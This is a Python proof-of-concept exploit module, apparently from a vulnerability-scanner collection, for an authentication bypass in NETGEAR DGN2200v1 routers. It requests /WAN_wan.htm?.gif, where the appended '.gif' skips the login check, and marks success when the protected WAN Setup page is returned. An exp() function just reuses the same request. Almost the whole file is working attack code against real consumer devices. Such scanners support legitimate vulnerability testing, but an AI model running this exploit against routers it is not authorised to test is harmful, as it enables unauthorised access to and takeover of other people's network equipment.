import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''NETGEAR DGN2200v1 Router Authentication Bypass''',
        "description": '''NETGEAR DGN2200v1 Router does not require authentication if a page has ".jpg", ".gif", or "ess_" substrings, however matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring (e.g., "?.gif").''',
        "severity": "high",
        "references": [
            "https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/", 
            "https://kb.netgear.com/000062646/Security-Advisory-for-Multiple-HTTPd-Authentication-Vulnerabilities-on-DGN2200v1"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["netgear", "auth-bypass", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/WAN_wan.htm?.gif"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/WAN_wan.htm?.gif"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""<title>WAN Setup</title>""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url